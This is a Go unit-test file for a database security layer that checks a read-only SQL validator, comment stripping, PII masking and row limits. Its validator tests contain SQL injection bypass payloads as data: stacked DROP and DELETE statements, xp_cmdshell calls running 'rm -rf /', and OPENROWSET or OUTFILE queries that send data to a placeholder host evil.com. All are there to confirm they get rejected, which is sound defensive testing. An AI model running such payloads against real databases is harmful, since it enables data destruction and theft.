package security

import (
	"regexp"
	"strconv"
	"strings"
	"testing"
)

func TestQueryValidator_ValidateQuery(t *testing.T) {
	validator := NewQueryValidator(nil, nil)

	tests := []struct {
		name    string
		query   string
		wantErr bool
	}{
		{
			name:    "Valid SELECT query",
			query:   "SELECT * FROM users WHERE id = 1",
			wantErr: false,
		},
		{
			name:    "Valid SELECT with JOIN",
			query:   "SELECT u.*, o.* FROM users u JOIN orders o ON u.id = o.user_id",
			wantErr: false,
		},
		{
			name:    "Valid WITH (CTE) query",
			query:   "WITH cte AS (SELECT * FROM users) SELECT * FROM cte",
			wantErr: false,
		},
		{
			name:    "Valid T-SQL SELECT TOP",
			query:   "SELECT TOP 10 * FROM users",
			wantErr: false,
		},
		{
			name:    "Valid T-SQL bracketed identifier",
			query:   "SELECT [id], [user name] FROM [dbo].[users]",
			wantErr: false,
		},
		{
			name:    "Valid paren-wrapped UNION",
			query:   "(SELECT id FROM users) UNION (SELECT id FROM customers)",
			wantErr: false,
		},
		{
			name:    "Block INSERT",
			query:   "INSERT INTO users (name) VALUES ('hacker')",
			wantErr: true,
		},
		{
			name:    "Block UPDATE",
			query:   "UPDATE users SET password = 'hacked' WHERE id = 1",
			wantErr: true,
		},
		{
			name:    "Block DELETE",
			query:   "DELETE FROM users WHERE id = 1",
			wantErr: true,
		},
		{
			name:    "Block DROP",
			query:   "DROP TABLE users",
			wantErr: true,
		},
		{
			name:    "Block ALTER",
			query:   "ALTER TABLE users ADD COLUMN hacked VARCHAR(255)",
			wantErr: true,
		},
		{
			name:    "Block TRUNCATE",
			query:   "TRUNCATE TABLE users",
			wantErr: true,
		},
		{
			name:    "Block EXEC",
			query:   "EXEC sp_executesql N'DROP TABLE users'",
			wantErr: true,
		},
		{
			name:    "Block EXECUTE",
			query:   "EXECUTE sp_malicious",
			wantErr: true,
		},
		{
			name:    "Allow column named 'updated_at'",
			query:   "SELECT id, updated_at FROM users",
			wantErr: false,
		},
		{
			name:    "Allow column named 'deleted'",
			query:   "SELECT id, deleted FROM users WHERE deleted = 0",
			wantErr: false,
		},

		// --- Fail-closed regression tests (regex-fallback bypass attempts) ---
		// These payloads relied on the old regex fallback letting them through
		// when the AST parser failed. With strict fail-closed validation they
		// must all be rejected — either by the multi-statement guard or by the
		// AST parser refusing to parse the input.
		{
			name:    "Bypass: stacked statement after SELECT prefix",
			query:   "SELECT 1; DROP TABLE users",
			wantErr: true,
		},
		{
			name:    "Bypass: EXEC split by inline comment",
			query:   "SELECT 1; EX/**/EC xp_cmdshell 'pwn'",
			wantErr: true,
		},
		{
			name:    "Bypass: stacked EXEC hidden behind a block comment prefix",
			query:   "/* SELECT test */ ; EXEC xp_cmdshell 'rm -rf /'",
			wantErr: true,
		},
		{
			name:    "Bypass: DROP after line comment terminator",
			query:   "SELECT 1 -- harmless\n; DROP TABLE users",
			wantErr: true,
		},
		{
			name:    "Bypass: stacked statement via single-quoted decoy",
			query:   "SELECT 'safe;data'; DELETE FROM users",
			wantErr: true,
		},
		{
			name:    "Bypass: T-SQL EXEC alone (parser rejects)",
			query:   "EXEC xp_cmdshell 'whoami'",
			wantErr: true,
		},
		{
			name:    "Bypass: unparseable garbage must not slip through",
			query:   "totally not valid sql ;;;",
			wantErr: true,
		},
		{
			name:    "Trailing semicolon on a single SELECT is tolerated",
			query:   "SELECT * FROM users;",
			wantErr: false,
		},
		{
			name:    "Semicolon inside string literal does not count as multi-statement",
			query:   "SELECT 'a;b' AS x FROM users",
			wantErr: false,
		},

		// --- SELECT-shape-disguised write/exfil attempts ---
		// First-keyword classification accepts SELECT/WITH, but these
		// statements still mutate state or exfiltrate. The forbidden-token
		// scan is the safety net.
		{
			name:    "Reject SELECT INTO new_table (T-SQL / PG table creation)",
			query:   "SELECT * INTO new_table FROM users",
			wantErr: true,
		},
		{
			name:    "Reject SELECT INTO #temp (T-SQL temp table)",
			query:   "SELECT * INTO #temp_users FROM users WHERE active = 1",
			wantErr: true,
		},
		{
			name:    "Reject SELECT INTO OUTFILE (MySQL filesystem write)",
			query:   "SELECT * FROM users INTO OUTFILE '/tmp/leak.csv'",
			wantErr: true,
		},
		{
			name:    "Reject SELECT INTO DUMPFILE (MySQL filesystem write)",
			query:   "SELECT password FROM users INTO DUMPFILE '/tmp/leak'",
			wantErr: true,
		},
		{
			name:    "Reject OPENROWSET ad-hoc remote query (exfil vector)",
			query:   "SELECT * FROM OPENROWSET('SQLOLEDB','evil.com';'sa';'pw','SELECT * FROM users')",
			wantErr: true,
		},
		{
			name:    "Reject OPENQUERY against linked server",
			query:   "SELECT * FROM OPENQUERY(remote_srv, 'SELECT * FROM users')",
			wantErr: true,
		},
		{
			name:    "Reject OPENDATASOURCE ad-hoc connection",
			query:   "SELECT * FROM OPENDATASOURCE('SQLOLEDB','Data Source=evil.com').db.dbo.users",
			wantErr: true,
		},
		{
			name:    "Reject CTE that exfils via SELECT INTO",
			query:   "WITH cte AS (SELECT id, password FROM users) SELECT * INTO leak FROM cte",
			wantErr: true,
		},
		{
			name:    "Forbidden token hidden in /* */ does NOT cause false reject (it's stripped)",
			query:   "SELECT id /* would write INTO somewhere */ FROM users",
			wantErr: false,
		},
		{
			name:    "Forbidden token hidden in string literal does NOT cause false reject",
			query:   "SELECT id, 'INTO is fine inside a string' AS note FROM users",
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateQuery(tt.query)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateQuery() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestFirstKeyword(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"plain SELECT", "SELECT * FROM t", "SELECT"},
		{"lowercase normalised", "select * from t", "SELECT"},
		{"leading whitespace", "   \n\tSELECT 1", "SELECT"},
		{"leading paren", "(SELECT 1)", "SELECT"},
		{"double leading paren", "((SELECT 1))", "SELECT"},
		{"block comment prefix", "/* hi */ SELECT 1", "SELECT"},
		{"line comment prefix", "-- hi\nSELECT 1", "SELECT"},
		{"WITH (CTE)", "WITH cte AS (SELECT 1) SELECT * FROM cte", "WITH"},
		{"T-SQL TOP still classifies as SELECT", "SELECT TOP 10 * FROM t", "SELECT"},
		{"DROP at start", "DROP TABLE x", "DROP"},
		// "/* SELECT */ ; EXEC bad" → after stripping comments/strings the
		// first non-whitespace, non-paren char is ';' which is not an
		// identifier, so firstKeyword returns "". The multi-statement guard
		// is what catches this payload separately.
		{"stacked payload has no leading identifier", "/* SELECT */ ; EXEC bad", ""},
		{"empty after stripping", "/* only comment */", ""},
		{"only whitespace", "   \n\t  ", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := firstKeyword(tt.in)
			if got != tt.want {
				t.Errorf("firstKeyword(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

func TestStripCommentsAndStrings(t *testing.T) {
	tests := []struct {
		name string
		in   string
		// We don't assert exact output (whitespace details may vary); we assert
		// that nothing that was hidden inside a comment/string remains.
		mustNotContain []string
		mustContain    []string
	}{
		{
			name:           "Block comment removed",
			in:             "SELECT /* DROP TABLE x */ 1",
			mustNotContain: []string{"DROP", "TABLE"},
			mustContain:    []string{"SELECT", "1"},
		},
		{
			name:           "Line comment removed",
			in:             "SELECT 1 -- DROP TABLE x\nFROM t",
			mustNotContain: []string{"DROP", "TABLE x"},
			mustContain:    []string{"SELECT", "FROM", "t"},
		},
		{
			name:           "String literal removed",
			in:             "SELECT 'DROP TABLE x' FROM t",
			mustNotContain: []string{"DROP", "TABLE x"},
			mustContain:    []string{"SELECT", "FROM", "t"},
		},
		{
			name:           "Escaped quote inside string handled",
			in:             "SELECT 'it''s; ok' FROM t",
			mustNotContain: []string{"it", ";", "ok"},
			mustContain:    []string{"SELECT", "FROM", "t"},
		},
		{
			name:           "Adjacent tokens do not fuse across stripped comment",
			in:             "EX/**/EC",
			mustNotContain: []string{"EXEC"},
			mustContain:    []string{"EX", "EC"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := stripCommentsAndStrings(tt.in)
			for _, s := range tt.mustNotContain {
				if strings.Contains(got, s) {
					t.Errorf("stripCommentsAndStrings(%q) = %q; must not contain %q", tt.in, got, s)
				}
			}
			for _, s := range tt.mustContain {
				if !strings.Contains(got, s) {
					t.Errorf("stripCommentsAndStrings(%q) = %q; expected to contain %q", tt.in, got, s)
				}
			}
		})
	}
}

func TestPIIMasker_MaskData(t *testing.T) {
	patterns := []MaskPattern{
		{
			Name:        "credit_card",
			Pattern:     `\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b`,
			Replacement: "****-****-****-****",
			Enabled:     true,
		},
		{
			Name:        "email",
			Pattern:     `\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b`,
			Replacement: "***@***.***",
			Enabled:     true,
		},
		{
			Name:        "turkish_id",
			Pattern:     `\b[1-9]\d{10}\b`,
			Replacement: "***********",
			Enabled:     true,
		},
	}

	masker, err := NewPIIMasker(patterns, true)
	if err != nil {
		t.Fatalf("Failed to create PIIMasker: %v", err)
	}

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "Mask credit card",
			input:    "My card is 1234 5678 9012 3456",
			expected: "My card is ****-****-****-****",
		},
		{
			name:     "Mask email",
			input:    "Contact: john.doe@example.com",
			expected: "Contact: ***@***.***",
		},
		{
			name:     "Mask Turkish ID",
			input:    "TC: 12345678901",
			expected: "TC: ***********",
		},
		{
			name:     "Mask multiple PIIs",
			input:    "Email: test@test.com, Card: 4111 1111 1111 1111",
			expected: "Email: ***@***.***, Card: ****-****-****-****",
		},
		{
			name:     "No PII to mask",
			input:    "This is a normal text without PII",
			expected: "This is a normal text without PII",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := masker.MaskData(tt.input)
			if result != tt.expected {
				t.Errorf("MaskData() = %v, want %v", result, tt.expected)
			}
		})
	}
}

func TestPIIMasker_Disabled(t *testing.T) {
	masker, err := NewPIIMasker(DefaultPIIPatterns(), false)
	if err != nil {
		t.Fatalf("Failed to create PIIMasker: %v", err)
	}

	input := "Email: test@test.com, Card: 1234 5678 9012 3456"
	result := masker.MaskData(input)

	if result != input {
		t.Errorf("Disabled masker should return original data, got %v", result)
	}
}

func TestQueryModifier_AddRowLimit(t *testing.T) {
	modifier := NewQueryModifier(100)

	tests := []struct {
		name         string
		query        string
		expectLimit  bool
		maxRowsInSQL int
	}{
		{
			name:         "Add LIMIT to simple SELECT",
			query:        "SELECT * FROM users",
			expectLimit:  true,
			maxRowsInSQL: 100,
		},
		{
			name:         "Add LIMIT to SELECT with WHERE",
			query:        "SELECT * FROM users WHERE active = 1",
			expectLimit:  true,
			maxRowsInSQL: 100,
		},
		{
			name:         "Keep existing LIMIT",
			query:        "SELECT * FROM users LIMIT 10",
			expectLimit:  true,
			maxRowsInSQL: 10, // Should keep original limit
		},
		{
			name:         "Add LIMIT to JOIN query",
			query:        "SELECT u.*, o.* FROM users u JOIN orders o ON u.id = o.user_id",
			expectLimit:  true,
			maxRowsInSQL: 100,
		},
		{
			name:         "Add LIMIT to UNION",
			query:        "SELECT * FROM users UNION SELECT * FROM customers",
			expectLimit:  true,
			maxRowsInSQL: 100,
		},
		{
			name:         "Override excessive LIMIT",
			query:        "SELECT * FROM users LIMIT 9999999",
			expectLimit:  true,
			maxRowsInSQL: 100, // excessive limit should be overridden to 100
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := modifier.AddRowLimit(tt.query)
			if err != nil {
				t.Errorf("AddRowLimit() error = %v", err)
				return
			}

			resultUpper := strings.ToUpper(result)
			if tt.expectLimit && !strings.Contains(resultUpper, "LIMIT") {
				t.Errorf("Query should contain LIMIT: %v", result)
			}

			// Verify the numeric LIMIT value equals the expected cap.
			if tt.expectLimit {
				re := regexp.MustCompile(`(?i)\bLIMIT\s+(\d+)`)
				m := re.FindStringSubmatch(result)
				if m == nil {
					t.Errorf("Could not parse LIMIT value from result: %s", result)
				} else {
					got, _ := strconv.Atoi(m[1])
					if got != tt.maxRowsInSQL {
						t.Errorf("LIMIT value = %d, want %d (query: %s)", got, tt.maxRowsInSQL, result)
					}
				}
			}

			t.Logf("Original: %s", tt.query)
			t.Logf("Modified: %s", result)
		})
	}
}

func TestQueryModifier_DefaultLimit(t *testing.T) {
	modifier := NewQueryModifier(0) // Should default to 1000

	query := "SELECT * FROM users"
	result, _ := modifier.AddRowLimit(query)

	if !strings.Contains(strings.ToUpper(result), "LIMIT") {
		t.Error("Should add default LIMIT when maxRowLimit is 0")
	}
}

func TestDefaultPIIPatterns(t *testing.T) {
	patterns := DefaultPIIPatterns()

	if len(patterns) == 0 {
		t.Error("DefaultPIIPatterns should return at least one pattern")
	}

	// Check that default patterns include common PII types
	expectedPatterns := []string{"credit_card", "email", "turkish_id"}

	for _, expected := range expectedPatterns {
		found := false
		for _, pattern := range patterns {
			if pattern.Name == expected {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("DefaultPIIPatterns missing expected pattern: %s", expected)
		}
	}
}
